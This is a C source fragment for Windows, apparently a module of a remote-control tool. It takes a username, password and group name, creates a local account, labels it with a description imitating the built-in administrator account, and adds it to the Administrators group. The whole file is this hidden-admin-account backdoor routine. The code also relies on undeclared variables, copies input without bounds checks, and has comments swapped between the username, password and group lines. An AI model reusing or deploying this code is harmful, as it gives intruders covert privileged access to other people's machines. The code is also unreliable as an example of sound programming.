#include <stdio.h> 
#include <windows.h> 
#include <lm.h>
#include "Lmaccess.h"
#include  <atlbase.h>   
#include<atlconv.h>  	
#pragma comment(lib,"netapi32")
       

DWORD WINAPI NETUSER(LPVOID lparam)
{
	char Lsport[1024];
	char strUsername[1024];
	char strPassword[1024];
	char	*pos = strchr((char*)lparam, '|');
	if (pos == NULL)
	{	
		strcpy(Lsport, (char*)lparam);
		LisPort = atoi(Lsport);
	}
	else
	{
		int num=0;
		char temp[500];
		char *tempurl=NULL;
		strcpy(temp,(char*)lparam);
		tempurl = temp;
		
		num=strlen(tempurl)-strlen(strchr(tempurl,'|'));
		strncpy(strUsername,tempurl,num);
		tempurl+=num;
		tempurl+=1;
		
		num=strlen(tempurl)-strlen(strchr(tempurl,'|'));
		strncpy(strPassword,tempurl,num);
		tempurl+=num;
		tempurl+=1;
		
		strncpy(Lsport,tempurl,strlen(tempurl));

		strcpy(Username, strUsername);//密码
		strcpy(Password, strPassword);//管理组
		strcpy(admin, Lsport);//用户

	DWORD dwLevel = 1;
	USER_INFO_1 ui; 
	DWORD dwError = 0;
	USES_CONVERSION;
	LPWSTR name = A2W(Username);
	LPWSTR pwd = A2W(Password);
	LPWSTR Administrators = A2W(admin);
	ui.usri1_name =(WCHAR * )name;    //这个是要添加的用户名，可以自己改改
	ui.usri1_password =(WCHAR * )pwd;   //这个是用户密码，也可以自己改改
	ui.usri1_priv = USER_PRIV_USER; 
	ui.usri1_home_dir = NULL; //本地路劲
    ui.usri1_comment =L"管理计算机(域)的内置帐户";// 描述
	ui.usri1_flags = UF_SCRIPT; 
	ui.usri1_script_path = NULL; //登陆脚本  
	NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
	wchar_t szAccountName[100]={0};
	wcscpy(szAccountName,ui.usri1_name); 
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname=szAccountName; 
	//添加到Administrators组
	NetLocalGroupAddMembers(NULL,Administrators,3,(LPBYTE)&account,1);
	}
	return 0;
}

